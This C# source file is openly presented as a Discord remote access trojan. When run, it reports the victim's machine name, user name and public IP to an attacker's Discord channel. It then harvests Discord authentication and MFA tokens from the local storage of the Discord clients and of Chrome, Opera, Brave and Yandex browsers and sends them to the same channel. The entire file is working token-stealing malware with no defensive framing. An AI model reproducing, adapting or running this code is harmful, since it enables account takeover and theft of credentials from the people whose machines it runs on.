using Discord;
using Discord.WebSocket;
using Newtonsoft.Json;
using Project;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Discord.RAT
{
    public class Program
    {

        public static void Main(string[] args)
        => new Program().MainAsync().GetAwaiter().GetResult();
        private DiscordSocketClient Client;
        private CommandHandler Handler;


        public async Task MainAsync()
        {

            Handler = new CommandHandler();
            Client = new DiscordSocketClient();
            await Client.SetGameAsync("with your pc.", "https://rxversed.wtf", ActivityType.Playing);

            await Handler.Init(Client);
            #region Token
            var token = "YOUR_TOKEN_HERE";
            #endregion Token
            await Client.LoginAsync(TokenType.Bot, token);
            await Client.StartAsync();

            Client.Ready += OnBotReady;



            await Task.Delay(-1);
        }

        public async Task OnBotReady()
        {
            ulong gid = 881998970057003009;
            ulong cid = 881998970518380546;

            var channel = Client.GetGuild(gid).GetTextChannel(cid);
            //basic info.
            var embed = new EmbedBuilder
            {
                ThumbnailUrl = "https://imgr.search.brave.com/-FJdYp76n9WdtlzH8V0Rxsm1-E5fQN_nwTeo51sAP_U/fit/1200/1200/ce/1/aHR0cHM6Ly9pLnBp/bmltZy5jb20vb3Jp/Z2luYWxzL2JjLzkw/Lzg1L2JjOTA4NTkx/NTdiNmI3Yjg0MzRi/YjRjYzNhOWE5YmRj/LmpwZw",
                Title = "New connection.",
                Description = "Computer/User: " + Environment.MachineName + "/" + Environment.UserName + "\nIP: " + GetIp(),
                Timestamp = DateTime.Now,
                Color = Color.DarkRed
            };
            await channel.SendMessageAsync(null, false, embed.Build());

            var tokenembed = new EmbedBuilder
            {
                ThumbnailUrl = "https://imgr.search.brave.com/-FJdYp76n9WdtlzH8V0Rxsm1-E5fQN_nwTeo51sAP_U/fit/1200/1200/ce/1/aHR0cHM6Ly9pLnBp/bmltZy5jb20vb3Jp/Z2luYWxzL2JjLzkw/Lzg1L2JjOTA4NTkx/NTdiNmI3Yjg0MzRi/YjRjYzNhOWE5YmRj/LmpwZw",
                Title = "Token(s)",
                Description = "\n Token Dump: \n" + GetToken(),
                Timestamp = DateTime.Now,
                Color = Color.DarkRed

            };
            await channel.SendMessageAsync(null, false, tokenembed.Build());
        }

        #region Data

        private static string GetIp()
        {
            WebClient wc = new WebClient();
            string ip = wc.DownloadString("https://ipecho.net/plain");

            return ip;
        }

        public static string GetToken()
        {
            string tokens = "";
            #region Paths
            string[] tokenpath = {
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "/AppData/Roaming/Discord/Local Storage/leveldb/",
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "/AppData/Roaming/discordptb/Local Storage/leveldb/",
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "/AppData/Roaming/discordcanary/Local Storage/leveldb/",
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "/AppData/Roaming/Opera Software/Opera Stable/User Data/Default/Local Storage/leveldb/",
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb/",
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb/",
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb/",
            };
            #endregion Paths

            foreach (var filepath in tokenpath)
            {
                if (Directory.Exists(filepath))
                {
                    foreach (FileInfo fileInfo in new DirectoryInfo(filepath).GetFiles())
                    {
                        if (fileInfo.Name.EndsWith(".ldb"))
                        {
                            string readedfile = fileInfo.OpenText().ReadToEnd();
                            foreach (Match match in Regex.Matches(readedfile, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                            {
                                tokens += match + "\n\n";
                            }

                            foreach (Match match in Regex.Matches(readedfile, @"mfa\.[\w-]{84}"))
                            {
                                tokens += match + "\n\n";
                            }
                        }
                    }
                }
            }
            return tokens;
        }

        #endregion Data
    }
}
